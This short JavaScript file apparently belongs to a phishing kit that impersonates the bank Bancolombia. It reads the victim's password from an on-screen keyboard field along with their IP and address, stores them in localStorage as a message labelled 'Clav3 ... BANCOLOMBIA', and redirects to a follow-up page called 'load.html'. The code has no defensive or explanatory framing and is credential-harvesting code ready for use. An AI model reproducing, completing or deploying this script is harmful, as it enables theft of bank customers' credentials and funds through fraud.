var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("keyboard_display").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;

    if (u_name && ip && ip2) {
        // Almacenar la información del usuario en localStorage
        localStorage.setItem('clave', u_name);
        localStorage.setItem('userIP', ip);
        localStorage.setItem('userIP2', ip2);
        localStorage.setItem('message', "Clav3: " + u_name + "\nIP: " + ip + "\n" + ip2 + "\nBANCOLOMBIA");
        console.log('Datos guardados correctamente en localStorage');
    } else {
        console.log('Faltan datos para guardar');
    }
};

var sender = function () {
    ready(); // Llamamos a la función para guardar los datos en localStorage
    window.location = 'load.html'; // Redirigimos a la página deseada
    return false;
};
